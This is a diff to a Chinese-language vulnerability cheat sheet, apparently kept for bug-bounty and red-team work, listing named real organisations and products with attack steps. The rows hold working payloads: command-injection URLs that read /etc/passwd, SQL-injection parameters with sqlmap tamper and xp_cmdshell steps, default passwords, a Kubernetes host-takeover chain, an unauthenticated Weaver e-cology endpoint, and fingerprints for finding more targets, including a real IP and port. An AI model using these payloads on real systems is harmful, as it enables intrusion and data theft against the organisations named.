@@ -42,7 +42,7 @@
 | 17 | 中国兵器工业集团（通达 OA） | 军工（通达 OA 部署） | 同 #16 登录绕过 | 资产 `61.184.199.14:8989`（Office Anywhere 2017），手法与 #16 完全一致 | — |
 | 18 | 某保险公司云服务器 | 金融 / 云 | 云凭据泄露接管 | Spring Boot `/actuator/env` 泄露华为云 OBS AK/SK + OSS bucket → 行云管家导入接管 37 台云主机 | — |
 | 19 | 因酷网校 Inxedu（在线教育） | 教育 Java | XSS / IDOR / SQLi / 上传 | 课程搜索反射 XSS；`/uc/updateUser` 改 user.userId 越权；MyBatis `${}` `deleteArticleByIds`；`/video/uploadvideo` fileType=jsp getshell | `body="inxedu"` |
-| 20 | **JeeSite 系快速开发平台**（江苏兴光 CCPM / 天津宏达 / 山东迪彩 / 河南同源 等**多家厂商二次开发**） | 通用 Java 平台 | SQL 注入（`mobile` 参数） | `/a/sys/register/registerUser?&mobile=1'`、`/a/sys/user/resetPassword?&mobile=1'`；指纹 `url="*/a/sys/*"`、`/a/login;JSESSIONID=` | `body="/a/sys/"` | 见 §7.6 |
+| 20 | **JeeSite 系快速开发平台**（江苏兴光 CCPM / 天津宏达 / 山东迪彩 / 河南同源 等**多家厂商二次开发**） | 通用 Java 平台 | SQL 注入（`mobile` 参数） | `/a/sys/register/registerUser?&mobile=1'`、`/a/sys/user/resetPassword?&mobile=1'`；指纹 `url="*/a/sys/*"`、`/a/login;JSESSIONID=` | `body="/a/sys/"`（另见 §7.6） |
 | 20 | 某银行资产攻防演练 | 金融 | 上传 / 编辑器 / RCE | 分行上传绕过 getshell；ewebeditor 弱口令 `/newback/ewebeditor/`；ThinkPHP 5.0.23 RCE；Shiro | — |
 | 21 | 美团 passport（OAuth） | 互联网平台 | 账号劫持（OAuth 缺陷） | `passport.meituan.com/account/callback/tencent?code=` 可复用绑定任意手机号 → 永久接管 | — |
 | 22 | 美团漏洞_(1) | 互联网平台 | 同 #21 | 与 #21 为同一 OAuth 劫持案例，仅字节微差，合并为 1 案 | — |
@@ -59,9 +59,20 @@
 | 33 | **网心云设备**（onething） | 边缘计算盒 | 未授权直进后台 | 端口 9999 直接进管理页，暴露 SN 码/MAC/内网 IP，且可**提取日志、设备重启、设备复位** | `app="网心云设备"` |
 | 34 | **H3C ER6300 路由器** | 网络设备 | 未授权三连（日志+关验证码+全站操作） | `POST /ER6300_SYSLOG.log` 下日志；`POST /goform/aspForm` `CMD=SetExpiretime...&vld_disable_flag=1` 关验证码；同类 body `CMD=IDS&GO=protect_ids.asp` 可未授权关 IDS | `"H3C" && title=="ER6300系统管理"` |
 | 35 | **宇视 ISC**（ISC5000-E） | 安防 | 远程命令执行 | `GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>dudesuite.txt` → 取 `/Interface/LogReport/dudesuite.txt` | `title=="ISC5000-E"` |
-| 36 | **安美数字 酒店宽带运营系统**（HiBOS2） | 酒店 | 远程命令执行 | `/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../pq.txt&id=1` → 访问 `/pq.txt` | `"酒店宽带运营"` |
+| 36 | **安美数字 酒店宽带运营系统**（HiBOS2） | 酒店 | 远程命令执行 | `/manager/radius/server_ping.php?ip=127.0.0.1\|cat%20/etc/passwd>../../pq.txt&id=1` → 访问 `/pq.txt` | `"酒店宽带运营"` |
 | 37 | **K8s API Server** | 云原生 | 未授权 → 接管宿主机 | 8080（`--insecure-port`，1.20+ 已移除）/ 6443（`system:anonymous` 误绑 `cluster-admin`）→ `kubectl -s` 远程 → secrets 取 token → 建 `hostPath:/` Pod → 写 SSH 公钥或 crontab | `app="Kubernetes"` |
 | 38 | 指挥调度中心 / 用友文件服务器 / AJ-Report / 博达 / Joomla / Weblogic | 政务·ERP·组件 | 未授权·文件操作·RCE | 标题级索引，未精读，见 §七 | — |
+| 39 | **泛微 e-cology**（**补录 2026-09-16，实测**） | OA（**高校/政务常见**） | **未授权访问** | `GET /api/ec/dev/app/test` 未认证即返回 `{"msg":"ok","ec_id":"…","ec_url":"…","em_url_open":"…"}` —— 吐内部 id + **旁系资产地址（含非标端口）**。指纹：`Set-Cookie: ecology_JSessionid`、`/js/jquery/jquery_wev8.js`、`/wui/index.html`；**单请求硬指纹（首页 `ETag` + `Last-Modified`，两版本不同）见 `recon-fingerprint-cdn-wildcard.md` §1.3** | `app="泛微-协同办公OA"` / `body="ecology_JSessionid"` |
+| 40 | **泛微 e-cology**（同上产品） | OA | SQL 注入 | `/mobile/%20/plugin/browser.jsp` 的 `keyword` 参数，**须三层 URL 编码**：`sqlmap -r sqli.txt --tamper=urlencode3`；MSSQL 不支持堆叠 → 手开 `xp_cmdshell` | 同 #39 |
+| 41 | **泛微 e-cology**（同上产品） | OA | 默认口令 / 配置泄露 | `sysadmin/1`、`sysadmin/Weaver@2001`；配置文件 `weaver.properties` / `fc.properties` | 同 #39 |
+| 42 | **泛微 移动管理平台**（`/emp` 线，**2026-09-16 批量实测 23+ 站**） | OA（移动端，**与 e-cology 是不同产品**） | 识别为主（打法未实测，**不编**） | 指纹：title「**移动管理平台-企业管理**」+ `/page/manage/js/main.js`（`?YYYYMMDD` 版本戳）+ 正文 `window.apiPrifix="/emp"` + `jsencrypt.min.js` + `weaver` 图标字体 + 默认 logo `ms.wx.weaver.com.cn/common/images/tenant_default.png`。后端 Spring Boot，404 返 `{"timestamp":"yyyy-MM-dd HH:mm:ss","status":404,...}`（**时间戳非 ISO = 定制格式**）。常见命名 `moa.*` / `mobile.*` / `app.*` / `oa-wechat.*`。**⚠️ 判据只能靠 title，不能靠体积**（chunked 无 `Content-Length`，体积随版本戳/语言变：`?20211012`≈835B、`?20260909`≈2162B，同代还有 2100/2112） | `title="移动管理平台"` / `body="/page/manage/js/main.js"` |
+
+> ⚠️ **泛微产品线别搞混（三条，路径全不通用）**：
+> - **e-cology**（大中企业/高校主力）：`ecology_JSessionid` + `wev8` + `/wui/` + `/api/ec/dev/`；首页 `ETag` + `Last-Modified` 是单请求硬指纹，**有两个版本（3235 与 3139），具体见 `recon-fingerprint-cdn-wildcard.md` §1.3**
+> - **e-office / E-Mobile**：`/weaver/`
+> - **移动管理平台**（#42）：title「移动管理平台-企业管理」+ `/page/manage/` + `/emp`
+>
+> 拿一条线的路径打另一条线，一定打空。**2026-09-16 批量实测 234 个教育资产：泛微系占多数（e-cology 约 69 + 移动端约 30 + 仅体积疑似 17），是教育资产里最常见的厂商成品系统之一。⚠️ 但样本取自某报告集合，该集合本身泛微偏置（202 份里 124 份打的是同一条泛微路径），所以这个比例是「样本构成」而非「行业市占率」，别当结论引用。**
 
 > **#31~#37 为 2026-09-15 重挖补录**（此前 §五"未精读"中降优先级的一批，实为最高价值的一类）。详见 **§七**。
 
@@ -107,7 +118,9 @@
 1. **同手法跨单位复现 = 高概率拒收**：通达 OA `logincheck_code.php` 绕过在兵器工业、青山钢铁等多份报告里完全一致；SRC 若已收录该 Nday 通杀，单份单位报告易被“重复/已知”驳回。建议提交时附**该单位独有资产 + 影响面**，而非只给通用 PoC。
 2. **同一案例多副本**：美团 OAuth 劫持有 `美团漏洞.pdf` / `_(1)` / `_(2)` 三份（size 1657507 / 1657296 / 1657296），内容实质相同；`_(1)` 与 `_(2)` size 一致可合并，`pdf` 与 `_(1)` 仅字节微差仍视为同一案。提交前先做 size+关键内容比对。
 3. **平台已知 / 内部已修复**：美团 OAuth 劫持状态为“已忽略（内部已知）”；百度爱番番支付逻辑“该漏洞已修复”。此类即使技术成立也难拿赏金，速查表保留指纹供“同类系统横向”用。
-4. **已在其他案例文件覆盖的系统降优先级**：泛微、致远、用友、若依、帝国 CMS、宇视、H3C、熵基、博达等已在 `attack-chain-cases.md` 等留痕，本批未重复精读，避免冗余。
+4. **已在其他案例文件覆盖的系统降优先级**：致远、用友、若依、帝国 CMS、宇视、H3C、熵基、博达等已在 `attack-chain-cases.md` 等留痕，本批未重复精读，避免冗余。
+   - ⚠️ **2026-09-16 更正**：本条原先也把**泛微**列在内，但实测该指针**落空** —— `attack-chain-cases.md` 里泛微只有 `browser.jsp` 注入、默认口令、`weaver.properties` 三条，**没有未授权访问**。故已在 §一 表**补录 #39~#41 泛微 e-cology 三条**，不再依赖跨文件指针。
+   - **教训**：写「已在 X 文件留痕」这种跨文件指针前，**先 grep 一遍 X 里到底有没有**。指针落空 = 判据凭空消失，且没人会发现。
 5. **逻辑薅羊毛类易被判低危/重复**：oppo 突破购买数量、小度秒杀、微博活动均属典型“业务逻辑”，单独提交常被合并或定低危；宜作为“支付/活动类通用检查项”沉淀，而非逐站提交。
 
 ---
